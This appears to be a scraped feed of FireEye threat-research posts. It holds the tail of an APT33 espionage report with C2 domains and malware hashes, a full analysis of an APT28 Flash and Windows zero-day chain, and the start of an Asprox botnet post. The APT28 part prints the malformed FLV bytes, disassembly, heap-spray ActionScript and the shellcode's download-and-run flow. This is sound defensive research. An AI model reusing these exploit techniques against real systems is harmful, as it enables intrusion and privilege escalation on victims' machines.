 <p>While we have not directly observed APT33 use SHAPESHIFT or
  otherwise carry out destructive operations, APT33 is the only group
  that we have observed use the DROPSHOT dropper. It is possible that
  DROPSHOT may be shared amongst Iran-based threat groups, but we do not
  have any evidence that this is the case.</p>
 <p>In March 2017, Kasperksy released a report that compared DROPSHOT
  (which they call Stonedrill) with the most recent variant of SHAMOON
  (referred to as Shamoon 2.0). They stated that both wipers employ
  anti-emulation techniques and were used to target organizations in
  Saudi Arabia, but also mentioned several differences. For example,
  they stated DROPSHOT uses more advanced anti-emulation techniques,
  utilizes external scripts for self-deletion, and uses memory injection
  versus external drivers for deployment. Kaspersky also noted the
  difference in resource language sections: SHAMOON embeds Arabic-Yemen
  language resources while DROPSHOT embeds Farsi (Persian) language resources.</p>
 <p>We have also observed differences in both targeting and tactics,
  techniques and procedures (TTPs) associated with the group using
  SHAMOON and APT33. For example, we have observed SHAMOON being used to
  target government organizations in the Middle East, whereas APT33 has
  targeted several commercial organizations both in the Middle East and
  globally. APT33 has also utilized a wide range of custom and publicly
  available tools during their operations. In contrast, we have not
  observed the full lifecycle of operations associated with SHAMOON, in
  part due to the wiper removing artifacts of the earlier stages of the
  attack lifecycle.</p>
 <p>Regardless of whether DROPSHOT is exclusive to APT33, both the
  malware and the threat activity appear to be distinct from the group
  using SHAMOON. Therefore, we assess there may be multiple Iran-based
  threat groups capable of carrying out destructive operations.</p>
 <h4>Additional Ties Bolster Attribution to Iran</h4>
 <p>APT33’s targeting of organizations involved in aerospace and energy
  most closely aligns with nation-state interests, implying that the
  threat actor is most likely government sponsored. This coupled with
  the timing of operations – which coincides with Iranian working hours
  – and the use of multiple Iranian hacker tools and name servers
  bolsters our assessment that APT33 may have operated on behalf of the
  Iranian government.</p>
 <p>The times of day that APT33 threat actors were active suggests that
  they were operating in a time zone close to 04:30 hours ahead of
  Coordinated Universal Time (UTC). The time of the observed attacker
  activity coincides with <a
    href="https://www.timeanddate.com/time/zones/irdt">Iran’s Daylight
  Time</a>, which is +0430 UTC.</p>
 <p>APT33 largely operated on days that correspond to Iran’s workweek,
  Saturday to Wednesday. This is evident by the lack of attacker
  activity on Thursday, as shown in Figure 6. Public sources report that
  Iran works a Saturday to Wednesday or Saturday to Thursday work week,
  with government offices <a
    href="https://financialtribune.com/articles/travel/59580/weekend-reform-proposal-rejected">closed
    on Thursday</a> and some <a
    href="http://www.irdiplomacy.ir/en/page/1959937/Will+Iran+Change+Weekends+to+Friday+and+Saturday.html">private
  businesses</a> operating on a half day schedule on
  Thursday.<sup> </sup>Many other Middle East countries have <a
  href="https://blogs.wsj.com/middleeast/2013/06/23/saudi-arabia-switches-its-weekend-pleasing-businesses">elected</a>
  to have a Friday and Saturday weekend.<sup> </sup>Iran is one of few
  countries that subscribes to a Saturday to Wednesday workweek.</p>
 <p>APT33 leverages popular Iranian hacker tools and DNS servers used by
  other suspected Iranian threat groups. The publicly available
  backdoors and tools utilized by APT33 – including NANOCORE, NETWIRE,
  and ALFA Shell – are all available on Iranian hacking websites,
  associated with Iranian hackers, and used by other suspected Iranian
  threat groups. While not conclusive by itself, the use of publicly
  available Iranian hacking tools and popular Iranian hosting companies
  may be a result of APT33’s familiarity with them and lends support to
  the assessment that APT33 may be based in Iran.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig7.png" />
  <br /> <span class="type-XS">Figure 6: APT33 Interactive Commands by
    Day of Week</span></p>
 <h4>Outlook and Implications</h4>
 <p>Based on observed targeting, we believe APT33 engages in strategic
  espionage by targeting geographically diverse organizations across
  multiple industries. Specifically, the targeting of organizations in
  the aerospace and energy sectors indicates that the threat group is
  likely in search of strategic intelligence capable of benefitting a
  government or military sponsor. APT33’s focus on aviation may indicate
  the group’s desire to gain insight into regional military aviation
  capabilities to enhance Iran’s aviation capabilities or to support
  Iran’s military and strategic decision making. Their targeting of
  multiple holding companies and organizations in the energy sectors
  align with Iranian national priorities for growth, especially as it
  relates to increasing petrochemical production. We expect APT33
  activity will continue to cover a broad scope of targeted entities,
  and may spread into other regions and sectors as Iranian interests dictate.</p>
 <p>APT33’s use of multiple custom backdoors suggests that they have
  access to some of their own development resources, with which they can
  support their operations, while also making use of publicly available
  tools. The ties to SHAPESHIFT may suggest that APT33 engages in
  destructive operations or that they share tools or a developer with
  another Iran-based threat group that conducts destructive operations.</p>
 <h4>Appendix</h4>
 <h5>Malware Family Descriptions</h5>
 <table cellspacing="0" cellpadding="0" border="0" width="472"> <tbody>
    <tr>
      <td width="77"><p>Malware Family</p> </td> <td
        width="331"><p>Description</p> </td> <td width="64"
        valign="bottom"><p>Availability</p> </td> </tr>
    <tr>
      <td width="77"><p>DROPSHOT</p> </td> <td width="331"><p>Dropper
          that has been observed dropping and launching the TURNEDUP
          backdoor, as well as the SHAPESHIFT wiper malware</p> </td>
        <td width="64"><p>Non-Public</p> </td> </tr>
    <tr>
      <td width="77"><p>NANOCORE</p> </td> <td width="331"><p>Publicly
          available remote access Trojan (RAT) available for purchase.
          It is a full-featured backdoor with a plugin framework</p>
      </td> <td width="64" valign="bottom"><p>Public</p> </td> </tr>
    <tr>
      <td width="77"><p>NETWIRE</p> </td> <td width="331"><p>Backdoor
          that attempts to steal credentials from the local machine from
          a variety of sources and supports other standard backdoor
        features.</p> </td> <td width="64" valign="bottom"><p>Public</p>
      </td> </tr>
    <tr>
      <td width="77"><p>TURNEDUP</p> </td> <td width="331"><p>Backdoor
          capable of uploading and downloading files, creating a reverse
          shell, taking screenshots, and gathering system
        information</p> </td> <td width="64"><p>Non-Public</p> </td> </tr></tbody></table>
 <h5>Indicators of Compromise</h5>
 <p>APT33 Domains Likely Used in Initial Targeting</p>
 <table cellspacing="0" cellpadding="0" border="1" width="221"> <tbody>
    <tr>
      <td width="221" valign="top"><p>Domain</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>boeing.servehttp[.]com</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>alsalam.ddns[.]net</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>ngaaksa.ddns[.]net</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>ngaaksa.sytes[.]net</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>vinnellarabia.myftp[.]org</p>
      </td> </tr></tbody></table>
 <p>APT33 Domains / IPs Used for C2</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="217" valign="top"><p>C2 Domain</p> </td> <td
        width="214" valign="top"><p>MALWARE</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>managehelpdesk[.]com</p> </td> <td
        width="214" valign="top"><p>NANOCORE</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>microsoftupdated[.]com</p> </td>
        <td width="214" valign="top"><p>NANOCORE</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>osupd[.]com</p> </td> <td
        width="214" valign="top"><p>NANOCORE</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>mywinnetwork.ddns[.]net</p> </td>
        <td width="214" valign="top"><p>NETWIRE</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>www.chromup[.]com</p> </td> <td
        width="214" valign="top"><p>TURNEDUP</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>www.securityupdated[.]com</p>
      </td> <td width="214" valign="top"><p>TURNEDUP</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>googlmail[.]net</p> </td> <td
        width="214" valign="top"><p>TURNEDUP</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>microsoftupdated[.]net</p> </td>
        <td width="214" valign="top"><p>TURNEDUP</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>syn.broadcaster[.]rocks</p> </td>
        <td width="214" valign="top"><p>TURNEDUP</p> </td> </tr>
    <tr>
      <td width="217" valign="top"><p>www.googlmail[.]net</p> </td> <td
        width="214" valign="top"><p>TURNEDUP</p> </td> </tr></tbody></table>
 <p>Publicly Available Tools used by APT33</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="213" valign="top"><p>MD5</p> </td> <td width="112"
        valign="top"><p>MALWARE</p> </td> <td width="106"
          valign="top"><p>Compile Time (UTC)</p> </td> </tr>
    <tr>
      <td width="213"
        valign="bottom"><p>3f5329cf2a829f8840ba6a903f17a1bf</p> </td>
        <td width="112"><p>NANOCORE</p> </td> <td width="106"
          valign="bottom"><p>2017/1/11 2:20</p> </td> </tr>
    <tr>
      <td width="213"
        valign="bottom"><p>10f58774cd52f71cd4438547c39b1aa7</p> </td>
        <td width="112"><p>NANOCORE</p> </td> <td width="106"
          valign="bottom"><p>2016/3/9 23:48</p> </td> </tr>
    <tr>
      <td width="213"
        valign="bottom"><p>663c18cfcedd90a3c91a09478f1e91bc</p> </td>
        <td width="112"><p>NETWIRE</p> </td> <td width="106"
          valign="bottom"><p>2016/6/29 13:44</p> </td> </tr>
    <tr>
      <td width="213"
        valign="bottom"><p>6f1d5c57b3b415edc3767b079999dd50</p> </td>
        <td width="112"><p>NETWIRE</p> </td> <td width="106"
          valign="bottom"><p>2016/5/29 14:11</p> </td> </tr></tbody></table>
 <p>Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="194" valign="top"><p>
          <b>MD5</b></p> </td> <td width="115" valign="top"><p>
          <b>MALWARE</b></p> </td> <td width="122" valign="top"><p>
          <b>Compile Time (UTC)</b></p> </td> </tr>
    <tr>
      <td width="194"
        valign="top"><p>0ccc9ec82f1d44c243329014b82d3125</p> </td> <td
        width="115" valign="top"><p>DROPSHOT</p> <p>(drops
        SHAPESHIFT</p> </td> <td width="122" valign="top"><p>n/a -
        timestomped</p> </td> </tr>
    <tr>
      <td width="194"
        valign="top"><p>fb21f3cea1aa051ba2a45e75d46b98b8</p> </td> <td
        width="115" valign="top"><p>DROPSHOT</p> </td> <td width="122"
          valign="top"><p>n/a - timestomped</p> </td> </tr>
    <tr>
      <td width="194"
        valign="top"><p>3e8a4d654d5baa99f8913d8e2bd8a184</p> </td> <td
        width="115" valign="top"><p>SHAPESHIFT</p> </td> <td width="122"
          valign="top"><p>2016/11/14 21:16:40</p> </td> </tr>
    <tr>
      <td width="194"
        valign="top"><p>6b41980aa6966dda6c3f68aeeb9ae2e0</p> </td> <td
        width="115" valign="top"><p>SHAPESHIFT</p> </td> <td width="122"
          valign="top"><p>2016/11/14 21:16:40</p> </td> </tr></tbody></table>
 <p>APT33 Malware MD5 Hashes</p>
 <table cellspacing="0" cellpadding="0" border="0" width="427"> <tbody>
    <tr>
      <td width="195"><p>MD5</p> </td> <td width="143"><p>MALWARE</p>
      </td> <td width="89"><p>Compile Time (UTC)</p> </td> </tr>
    <tr>
      <td width="195"><p>8e67f4c98754a2373a49eaf53425d79a</p> </td> <td
          width="143"><p>DROPSHOT (drops TURNEDUP)</p> </td> <td
          width="89"><p>2016/10/19 14:26</p> </td> </tr>
    <tr>
      <td width="195"><p>c57c5529d91cffef3ec8dadf61c5ffb2</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c02689449a4ce73ec79a52595ab590f6</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2016/9/18
        10:50</p> </td> </tr>
    <tr>
      <td width="195"><p>59d0d27360c9534d55596891049eb3ef</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2016/3/8
        12:34</p> </td> </tr>
    <tr>
      <td width="195"><p>59d0d27360c9534d55596891049eb3ef</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2016/3/8
        12:34</p> </td> </tr>
    <tr>
      <td width="195"><p>797bc06d3e0f5891591b68885d99b4e1</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/12
        5:59</p> </td> </tr>
    <tr>
      <td width="195"><p>8e6d5ef3f6912a7c49f8eb6a71e18ee2</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/12
        5:59</p> </td> </tr>
    <tr>
      <td width="195"><p>32a9a9aa9a81be6186937b99e04ad4be</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/12
        5:59</p> </td> </tr>
    <tr>
      <td width="195"><p>a272326cb5f0b73eb9a42c9e629a0fd8</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/9
        16:56</p> </td> </tr>
    <tr>
      <td width="195"><p>a813dd6b81db331f10efaf1173f1da5d</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/9
        16:56</p> </td> </tr>
    <tr>
      <td width="195"><p>de9e3b4124292b4fba0c5284155fa317</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/9
        16:56</p> </td> </tr>
    <tr>
      <td width="195"><p>a272326cb5f0b73eb9a42c9e629a0fd8</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2015/3/9
        16:56</p> </td> </tr>
    <tr>
      <td width="195"><p>b3d73364995815d78f6d66101e718837</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>de7a44518d67b13cda535474ffedf36b</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>b5f69841bf4e0e96a99aa811b52d0e90</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>a2af2e6bbb6551ddf09f0a7204b5952e</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>b189b21aafd206625e6c4e4a42c8ba76</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>aa63b16b6bf326dd3b4e82ffad4c1338</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c55b002ae9db4dbb2992f7ef0fbc86cb</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c2d472bdb8b98ed83cc8ded68a79c425</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c6f2f502ad268248d6c0087a2538cad0</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c66422d3a9ebe5f323d29a7be76bc57a</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>ae47d53fe8ced620e9969cea58e87d9a</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>b12faab84e2140dfa5852411c91a3474</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>c2fbb3ac76b0839e0a744ad8bdddba0e</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>a80c7ce33769ada7b4d56733d02afbe5</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>6a0f07e322d3b7bc88e2468f9e4b861b</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>b681aa600be5e3ca550d4ff4c884dc3d</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>ae870c46f3b8f44e576ffa1528c3ea37</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>bbdd6bb2e8827e64cd1a440e05c0d537</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2014/6/1
        11:01</p> </td> </tr>
    <tr>
      <td width="195"><p>0753857710dcf96b950e07df9cdf7911</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2013/4/10
        10:43</p> </td> </tr>
    <tr>
      <td width="195"><p>d01781f1246fd1b64e09170bd6600fe1</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2013/4/10
        10:43</p> </td> </tr>
    <tr>
      <td width="195"><p>1381148d543c0de493b13ba8ca17c14f</p> </td> <td
        width="143"><p>TURNEDUP</p> </td> <td width="89"><p>2013/4/10
        10:43</p> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html2017-09-20T14:00:00.000Z2020-07-24T06:58:43.749ZOperation RussianDoll: Adobe &amp; Windows Zero-Day Exploits Likely
Leveraged by Russia’s APT28 in Highly-Targeted Attacknoemail@noemail.orgFireeye Labs<p>FireEye Labs recently detected a limited APT campaign exploiting
  zero-day vulnerabilities in Adobe Flash and a brand-new one in
  Microsoft Windows. Using the <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html"
    target="_self">Dynamic Threat Intelligence Cloud (DTI)</a>, FireEye
  researchers detected a pattern of attacks beginning on April
      13<sup>th<a
  href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html"></a></sup>,
  2015. Adobe independently patched the vulnerability (CVE-2015-3043) in
    <a
  href="https://helpx.adobe.com/security/products/flash-player/apsb15-06.html">APSB15-06</a>.
  Through correlation of technical indicators and command and control
  infrastructure, FireEye assess that APT28 is probably responsible for
  this activity.</p>
 <p>Microsoft is aware of the outstanding local privilege escalation
  vulnerability in Windows (CVE-2015-1701). While there is not yet a
  patch available for the Windows vulnerability, updating Adobe Flash to
  the latest version will render this in-the-wild exploit innocuous. We
  have only seen CVE-2015-1701 in use in conjunction with the Adobe
  Flash exploit for CVE-2015-3043. The Microsoft Security Team is
  working on a fix for CVE-2015-1701.</p>
 <h2>Exploit Overview</h2>
 <p>The high level flow of the exploit is as follows:</p>
 <p>1.       User clicks link to attacker controlled website<br />
  2.       HTML/JS launcher page serves Flash exploit<br /> 3.      
  Flash exploit triggers CVE-2015-3043, executes shellcode<br />
  4.       Shellcode downloads and runs executable payload<br />
  5.       Executable payload exploits local privilege escalation
  (CVE-2015-1701) to steal System token</p>
 <p>The Flash exploit is served from unobfuscated HTML/JS. The launcher
  page picks one of two Flash files to deliver depending upon the
  target’s platform (Windows 32 versus 64bits).</p>
 <p>The Flash exploit is mostly unobfuscated with only some light
  variable name mangling. The attackers relied heavily on the
  CVE-2014-0515 Metasploit module, which is well documented. It is
  ROPless, and instead constructs a fake vtable for a FileReference
  object that is modified for each call to a Windows API.</p>
 <p>The payload exploits a local privilege escalation vulnerability in
  the Windows kernel if it detects that it is running with limited
  privileges. It uses the vulnerability to run code from userspace in
  the context of the kernel, which modifies the attacker’s process token
  to have the same privileges as that of the System process.</p>
 <h2>CVE-2015-3043 Exploit</h2>
 <p>The primary difference between the CVE-2014-0515 metasploit module
  and this exploit is, obviously, the vulnerability. CVE-2014-0515
  exploits a vulnerability in Flash’s Shader processing, whereas
  CVE-2015-3043 exploits a vulnerability in Flash’s FLV processing. The
  culprit FLV file is embedded within AS3 in two chunks, and is
  reassembled at runtime.</p>
 <h3>Vulnerability</h3>
 <p>A buffer overflow vulnerability exists in Adobe Flash Player
  (&lt;=17.0.0.134) when parsing malformed FLV objects. Attackers
  exploiting the vulnerability can corrupt memory and gain remote code execution.</p>
 <p>In the exploit, the attacker embeds the FLV object directly in the
  ActionScript code, and plays the video using NetStream class. In
  memory, it looks like the following:</p>
 <p>0000000: 46 4c 56 01 05 00 00 00 09 00 00 00 00 12 00 00 
  FLV.............<br /> 0000010: f4 00 00 00 00 00 00 00 02 00 0a 6f 6e
  4d 65 74  ...........onMet<br /> 0000020: 61 44 61 74 61 08 00 00 00
  0b 00 08 64 75 72 61  aData.......dura<br /> 0000030: 74 69 6f 6e 00
  40 47 ca 3d 70 a3 d7 0a 00 05 77  tion.@G.=p.....w<br /> 0000040: 69
  64 74 68 00 40 74 00 00 00 00 00 00 00 06 68  idth.@t........h<br />
  0000050: 65 69 67 68 74 00 40 6e 00 00 00 00 00 00 00 0d 
  eight.@n........<br /> 0000060: 76 69 64 65 6f 64 61 74 61 72 61 74 65
  00 00 00  videodatarate...<br /> …..<br /> 0003b20: 27 6e ee 72 87 1b
  47 f7 41 a0 00 00 00 3a 1b 08  'n.r..G.A....:..<br /> 0003b30: 00 04
  41 00 00 0f 00 00 00 00 68 ee ee ee ee ee  ..A.......h.....<br />
  0003b40: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee 
  ................<br /> 0003b50: ee ee ee ee ee ee ee ee ee ee ee ee ee
  ee ee ee  ................<br /> 0003b60: ee ee ee ee ee ee ee ee ee
  ee ee ee ee ee ee ee  ................<br /> </p>
 <p>Files of the FLV file format contain a sequence of Tag structures.
  In Flash, these objects are created when parsing FLV Tags:</p>
 <p>.text:1018ACE9 sub_1018ACE9    proc near               ; CODE XREF:
  sub_1018BBAC+2Bp<br />
  .text:1018ACE9                                         ;
  sub_10192797+1A1p ...<br /> .text:1018ACE9<br /> .text:1018ACE9
  arg_0           = dword ptr  4<br /> .text:1018ACE9<br />
  .text:1018ACE9                 mov     eax, ecx<br />
  .text:1018ACEB                 mov     ecx, [esp+arg_0]<br />
  .text:1018ACEF                 mov     dword ptr [eax], offset
  off_10BA771C<br /> .text:1018ACF5                 mov     dword ptr
  [eax+24h], 1<br /> .text:1018ACFC                 and     dword ptr
  [eax+14h], 0<br /> .text:1018AD00                 mov     [eax+28h],
  ecx<br /> .text:1018AD03                 mov     byte ptr [eax+20h],
  0<br /> .text:1018AD07                 retn    4<br /> .text:1018AD07
  sub_1018ACE9    endp<br /> </p>
 <p>In the case of this exploit, a Tag structure begins at offset 0x3b2f
  into the FLV stream that, when parsed, populates the Tag structure as follows:</p>
 <p>Tag 2:<br /> UINT_8 type: 8<br /> UINT_24 datasize: 1089<br />
  UINT_24 timestamp: 15<br /> UINT_8 timestamphi: 0<br /> UINT_24
  streamid: 0<br /> UINT_4 fmt: 6<br /> UINT_2 sr: 2<br /> UINT_1 bits:
  0<br /> UINT_1 channels: 0<br /> UBYTE data[1088]:
  \xee\xee\xee\xee…<br /> UINT_32 lastsize: 0xeeeeeeee<br /> </p>
 <p>Beginning within the data field, all contents of the FLV stream
  become 0xEE. Consequently, the data and lastsize fields are mangled,
  and one final tag technically exists consisting exclusively of 0xEE:</p>
 <p>Tag 3:<br /> UINT_8 type: 0xEE<br /> UINT_24 datasize:
  0xEEEEEE<br /> …<br /> </p>
 <p>One can see the datasize field of Tag2 populated from the attacker's
  FLV stream below:</p>
 <p>
  <br /> .text:10192943                 mov     eax, [ebx+24h]<br />
  .text:10192946                 mov     [esi+14h], eax<br />
  .text:10192949                 movzx   eax, byte ptr [ebx+19h] ;
  00<br /> .text:1019294D                 movzx   ecx, byte ptr
  [ebx+1Ah] ; 04<br /> .text:10192951                 shl     eax,
  8<br /> .text:10192954                 or      eax, ecx<br />
  .text:10192956                 movzx   ecx, byte ptr [ebx+1Bh] ;
  41<br /> .text:1019295A                 shl     eax, 8<br />
  .text:1019295D                 or      eax, ecx<br />
  .text:1019295F                 mov     ecx, ebx<br />
  .text:10192961                 mov     [esi+0Ch], eax  ; 0x441<br />
  .text:10192964                 call    sub_1002E2B3<br /> </p>
 <p>The buffer is allocated with fixed size 0x2000:</p>
 <p>.text:101A647E                 push    2000h<br />
  .text:101A6483                 mov     ecx, esi<br />
  .text:101A6485                 call    sub_101A6257    ; alloc 0x2000
  buffer, store in esi+0xDC<br /> ……<br />
  .text:101A627F                 push    0<br />
  .text:101A6281                 push    edi             ; 0x2000<br />
  .text:101A6282                 call    sub_105EBEB0<br />
  .text:101A6287                 pop     ecx<br />
  .text:101A6288                 pop     ecx<br />
  .text:101A6289                 mov     [esi+0DCh], eax</p>
 <p>Since the size is controlled by the attacker, it’s possible to
  overflow the fixed size buffer with certain data.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-1.png" /></p>
 <p>A datasize of 0x441 results in a value here of 0x1100 passed to
  sub_100F88F8, which memcopies 0x2200 bytes in 0x11 chunks of 0x200.
  The last memcpy overflows the fixed size 0x2000 buffer into a adjacent
  heap memory.</p>
 <p>Attackers spray the heap with array of Vector, 0x7fe * 4 + 8 ==
  0x2000, and create holes of such size, which will be allocated by the
  said object.</p>
 <p>            while (_local_2 &lt; this._bp35) // _bp35 ==
  0x2000<br />             {<br />                this._ok47[_local_2] =
  new Vector.&lt;uint&gt;(this._lb60); // _lb60 == 0x07FE<br />
                 _local_3 = 0x00;<br />               while (_local_3
  &lt; this._lb60)<br />               {<br />                  
  this._ok47[_local_2][_local_3] = 0x41414141;<br />                  
  _local_3++;<br />                };<br />                _local_2 =
  (_local_2 + 0x01);<br />              };<br />              _local_2 =
  0x00;<br />             while (_local_2 &lt; this._bp35)<br />
              {<br />                this._ok47[_local_2] = null;<br />
                 _local_2 = (_local_2 + 0x02);<br />              };</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-2.JPG" /></p>
 <p>As the previous picture demonstrated, the followed Vector object’s
  length field being overflowed as 0x80007fff, which enables the
  attacker to read/write arbitrary data within user space.</p>
 <h2>Shellcode</h2>
 <p>Shellcode is passed to the exploit from HTML in flashvars. The
  shellcode downloads the next stage payload, which is an executable
  passed in plaintext, to the temp directory with UrlDownloadToFileA,
  which it then runs with WinExec.</p>
 <h2>Payload &amp; C2</h2>
 <p>This exploit delivers a malware variant that shares characteristics
  with the APT28 backdoors CHOPSTICK and CORESHELL malware families,
  both described in our APT28 <a
  href="https://www2.fireeye.com/apt28.html">whitepaper</a>.  The
  malware uses an RC4 encryption key that was previously used by the
  CHOPSTICK backdoor.  And the C2 messages include a checksum algorithm
  that resembles those used in CHOPSTICK backdoor communications.  In
  addition, the network beacon traffic for the new malware resembles
  those used by the CORESHELL backdoor.  Like CORESHELL, one of the
  beacons includes a process listing from the victim host.  And like
  CORESHELL, the new malware attempts to download a second-stage executable.</p>
 <p>One of the C2 locations for the new payload, <span
  style="font-family: Courier New;">87.236.215[.]246</span>, also hosts
  a suspected APT28 domain <span
  style="font-family: Courier New;">ssl-icloud[.]com</span>.  The same
  subnet (<span
  style="font-family: Courier New;">87.236.215.0/24</span>) also hosts
  several known or suspected APT28 domains, as seen in Table 1.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/table.PNG" /></p>
 <p>The target firm is an international government entity in an industry
  vertical that aligns with known APT28 targeting.</p>
 <h2>CVE-2015-1701 Exploit</h2>
 <p>The payload contains an exploit for the unpatched local privilege
  escalation vulnerability CVE-2015-1701 in Microsoft Windows. The
  exploit uses CVE-2015-1701 to execute a callback in userspace. The
  callback gets the EPROCESS structures of the current process and the
  System process, and copies data from the System token into the token
  of the current process. Upon completion, the payload continues
  execution in usermode with the privileges of the System process.</p>
 <p>Because CVE-2015-3043 is already patched, this remote exploit will
  not succeed on a fully patched system. If an attacker wanted to
  exploit CVE-2015-1701, they would first have to be executing code on
  the victim’s machine. Barring authorized access to the victim’s
  machine, the attacker would have to find some other means, such as
  crafting a new Flash exploit, to deliver a CVE-2015-1701 payload.</p>
 <p>Microsoft is aware of CVE-2015-1701 and is working on a fix.
  CVE-2015-1701 does not affect Windows 8 and later.</p>
 <h1>Acknowledgements</h1>
 <p>Thank you to all of the contributors to this blog!</p>
 <ul class="list-bullet"> <li>The following people in FireEye: Dan
    Caselden, Yasir Khalid, James “Tom” Bennett, GenWei Jiang, Corbin
    Souffrant, Joshua Homan, Jonathan Wrolstad, Chris Phillips, Darien
  Kindlund</li> <li>Microsoft &amp; Adobe security teams</li> </ul>
 <p> </p>
http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html2015-04-18T16:10:00.000Z2020-07-24T06:58:43.731ZA Not-So Civic Duty: Asprox Botnet Campaign Spreads Court Dates and
Malwarenoemail@noemail.orgAmanda Stewart<p>
  <b>Executive Summary</b></p>
 <p>FireEye Labs has been tracking a recent spike in malicious email
  detections that we attribute to a campaign that began in 2013. While
  malicious email campaigns are nothing new, this one is significant in
  that we are observing mass-targeting attackers adopting the malware
  evasion methods pioneered by the stealthier APT attackers. And this is
  certainly a high-volume business, with anywhere from a few hundred to
  ten thousand malicious emails sent daily – usually distributing
  between 50 and 500,000 emails per outbreak.</p>
 <p>Through the <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">FireEye
    Dynamic Threat Intelligence (DTI) cloud</a>, FireEye Labs discovered
  that each and every major spike in email blasts brought a change in
  the attributes of their attack. These changes have made it difficult
  for anti-virus, IPS, firewalls and file-based sandboxes to keep up
  with the malware and effectively protect endpoints from infection.
  Worse, if past is prologue, we can expect other malicious,
  mass-targeting email operators to adopt this approach to bypass
  traditional defenses.</p>
